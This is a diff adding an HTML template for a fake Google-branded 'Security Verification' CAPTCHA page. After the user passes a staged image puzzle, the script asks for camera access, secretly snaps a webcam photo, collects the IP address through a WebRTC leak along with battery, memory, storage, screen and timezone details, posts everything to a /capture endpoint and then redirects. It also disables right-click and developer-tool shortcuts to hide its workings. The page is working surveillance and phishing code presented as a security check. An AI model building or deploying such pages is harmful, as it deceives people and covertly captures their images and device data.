@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Security Verification</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url("{{ bgImg }}") no-repeat center center/cover;
+            overscroll-behavior: none;
+        }
+        .overlay {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+        .container {
+            background: rgb(247, 245, 245);
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .captcha-box {
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            background: #f1f1f1;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        .captcha-img {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            justify-items: center;
+        }
+        .captcha-img img {
+            width: 90px;
+            height: 90px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            border-radius: 4px;
+            object-fit: cover;
+            transition: transform 0.2s ease;
+        }
+        .captcha-img img:hover {
+            transform: scale(1.05);
+        }
+        .captcha-img img.selected {
+            border: 4px solid #30d636;
+            transform: scale(1.02);
+        }
+        .loading, #camera-access, #retry-section {
+            display: none;
+        }
+        .spinner {
+            width: 3.5rem;
+            height: 3.5rem;
+            border: 6px solid rgba(0,0,0,.1);
+            border-top-color: #007bff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: auto;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .error-state {
+            color: #dc3545;
+            font-size: 0.9em;
+            margin-top: 8px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .security-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 0.8em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"> 
+        <div class="container">
+            <div class="security-badge">Secure Connection</div>
+            <div class="d-flex justify-content-center align-items-center mb-4">
+                <img src="https://th.bing.com/th/id/OIP.IGQ4-lvxNaPtCdmsgQpbtAHaHa?rs=1&pid=ImgDetMain" alt="Google Logo" style="width: 28px; height: auto; margin-right: 12px;">
+                <h4 class="text-primary mb-0">Security Verification</h4>
+            </div>
+            <p id="captcha-text" class="status-text mb-4">Select all images with traffic lights</p>
+            <div id="captcha-section">
+                <div class="captcha-box">
+                    <div class="captcha-img">
+                        <img src="https://videodelivery.net/8145563941034b2f540aae873c1b017c/thumbnails/thumbnail.jpg?time=5s&fit=crop&height=480&width=640" data-correct="true" onclick="selectImage(this)">
+                        <img src="https://i.ytimg.com/vi/a2-dd46yH44/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAg6BOqALFT8X107_nKuNLApjqRfg" data-correct="false" onclick="selectImage(this)">
+                        <img src="https://static.vecteezy.com/system/resources/thumbnails/048/040/375/small/outdoor-cctv-security-camera-operating-on-the-street-surveillance-camera-at-the-crossroads-of-a-big-city-high-angle-view-video.jpg" data-correct="false" onclick="selectImage(this)">
+                        <img src="https://th.bing.com/th/id/OIP._fr8foM2oDuqGwPAYeXdegAAAA?rs=1&pid=ImgDetMain" data-correct="true" onclick="selectImage(this)">
+                        <img src="https://i.ytimg.com/vi/wXITU-Kfp2Y/maxresdefault.jpg" data-correct="true" onclick="selectImage(this)">
+                        <img src="https://images.pexels.com/videos/5977704/police-car-5977704.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" data-correct="false" onclick="selectImage(this)">
+                    </div>
+                    <button class="btn btn-outline-primary w-100 mt-3" onclick="verifyCaptcha()">Verify</button>
+                </div>
+            </div>
+
+            <div id="camera-access">
+                <p>Confirm you're not a robot. Please allow camera access.</p>
+                <button class="btn btn-primary w-100" onclick="startVerification()">Allow Camera</button>
+                <p id="status" class="mt-3"></p>
+            </div>
+
+            <div id="retry-section">
+                <p class="text-danger">Verification Failed</p>
+                <button class="btn btn-warning w-100" onclick="retryVerification()">Try Again</button>
+            </div>
+
+            <div class="loading">
+                <div class="spinner"></div>
+                <p class="mt-2 text-secondary">Processing Verification...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        'use strict';
+
+        const STATE = {
+            selectedImages: new Map(),
+            verifying: false,
+            cameraActive: false,
+            attempts: 0,
+            maxAttempts: 3,
+            sessionId: crypto.randomUUID(),
+            userData: {}
+        };
+
+        // Security Measures
+        window.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
+        });
+
+        function selectImage(img) {
+            if (STATE.verifying) return;
+            const imgSrc = img.src;
+            const isCorrect = img.dataset.correct === 'true';
+            
+            if (STATE.selectedImages.has(imgSrc)) {
+                img.classList.remove('selected');
+                STATE.selectedImages.delete(imgSrc);
+            } else {
+                img.classList.add('selected');
+                STATE.selectedImages.set(imgSrc, isCorrect);
+            }
+        }
+
+        async function verifyCaptcha() {
+            if (STATE.verifying || STATE.attempts >= STATE.maxAttempts) return;
+            STATE.verifying = true;
+            STATE.attempts++;
+
+            try {
+                const correctSelections = Array.from(STATE.selectedImages.values()).filter(v => v).length;
+                const incorrectSelections = STATE.selectedImages.size - correctSelections;
+                const totalCorrect = document.querySelectorAll('img[data-correct="true"]').length;
+
+                if (correctSelections === totalCorrect && incorrectSelections === 0 && STATE.selectedImages.size > 0) {
+                    await transitionToCameraPhase();
+                } else {
+                    showError(`❌ Verification Failed! ${STATE.maxAttempts - STATE.attempts} attempts left`);
+                    if (STATE.attempts >= STATE.maxAttempts) {
+                        showRetrySection();
+                    }
+                    resetCaptcha();
+                }
+            } catch (error) {
+                console.error('Captcha verification error:', error);
+                showError('An unexpected error occurred. Please try again.');
+            } finally {
+                STATE.verifying = false;
+            }
+        }
+
+        async function transitionToCameraPhase() {
+            const elements = {
+                captchaSection: document.getElementById('captcha-section'),
+                captchaText: document.getElementById('captcha-text'),
+                loading: document.querySelector('.loading'),
+                cameraAccess: document.getElementById('camera-access')
+            };
+
+            elements.captchaSection.style.display = 'none';
+            elements.captchaText.style.display = 'none';
+            elements.loading.style.display = 'block';
+
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            elements.loading.style.display = 'none';
+            elements.cameraAccess.style.display = 'block';
+        }
+
+        async function startVerification() {
+            if (STATE.cameraActive) return;
+            STATE.cameraActive = true;
+
+            const status = document.getElementById('status');
+            const loading = document.querySelector('.loading');
+            let stream;
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false 
+                });
+                status.className = 'mt-3 text-success';
+                status.textContent = 'Camera access granted!';
+                loading.style.display = 'block';
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = async () => {
+                    await video.play();
+                    const canvas = document.createElement('canvas');
+                    const context = canvas.getContext('2d', { alpha: false });
+                    
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                    const ram = navigator.deviceMemory || 'Not supported'; // RAM in GB
+                    const storageEstimate = await navigator.storage?.estimate() || { quota: 'Not supported' };
+                    const rom = storageEstimate.quota !== 'Not supported' ? `${Math.round(storageEstimate.quota / (1024 * 1024 * 1024))} GB` : 'Not supported';
+                    const battery = await getBatteryInfo();
+
+                    await sendCapture(imageData, ram, rom, battery);
+                    stopStream(stream);
+                    await redirectAfterDelay();
+                };
+            } catch (error) {
+                console.error('Camera error:', error);
+                status.className = 'mt-3 text-danger error-state';
+                status.textContent = `Camera access denied: ${error.message}`;
+                showRetrySection();
+            } finally {
+                STATE.cameraActive = false;
+            }
+        }
+
+        async function sendCapture(imageData, ram, rom, battery) {
+            try {
+                STATE.userData = {
+                    sessionId: STATE.sessionId,
+                    timestamp: new Date().toISOString(),
+                    ipAddress: await getIPFromWebRTC() || 'Not available',
+                    userAgent: navigator.userAgent,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language || 'Unknown',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                    battery: battery,
+                    ram: ram,
+                    rom: rom,
+                    selectedImages: Array.from(STATE.selectedImages.keys())
+                };
+
+                await fetch('/capture', {
+                    method: 'POST',
+                    body: JSON.stringify({ 
+                        img: imageData,
+                        userData: STATE.userData
+                    }),
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Session-ID': STATE.sessionId
+                    },
+                    credentials: 'same-origin'
+                });
+            } catch (error) {
+                console.error('Failed to send capture:', error);
+            }
+        }
+
+        function stopStream(stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        async function redirectAfterDelay() {
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            window.location.href = '{{ redUrl }}' || '/success';
+        }
+
+        function showError(message) {
+            const status = document.getElementById('status');
+            status.className = 'mt-3 text-danger error-state';
+            status.textContent = message;
+        }
+
+        function resetCaptcha() {
+            STATE.selectedImages.clear();
+            document.querySelectorAll('.captcha-img img').forEach(img => {
+                img.classList.remove('selected');
+            });
+        }
+
+        function showRetrySection() {
+            document.getElementById('captcha-section').style.display = 'none';
+            document.getElementById('camera-access').style.display = 'none';
+            document.getElementById('retry-section').style.display = 'block';
+        }
+
+        function retryVerification() {
+            STATE.attempts = 0;
+            resetCaptcha();
+            document.getElementById('retry-section').style.display = 'none';
+            document.getElementById('captcha-section').style.display = 'block';
+            document.getElementById('captcha-text').style.display = 'block';
+            document.getElementById('status').textContent = '';
+        }
+
+        async function getIPFromWebRTC() {
+            return new Promise(resolve => {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0];
+                        resolve(ip);
+                        pc.close();
+                    }
+                };
+                setTimeout(() => resolve(null), 3000);
+            });
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+            }
+            return 'Not supported';
+        }
+    </script>
+</body>
+</html>
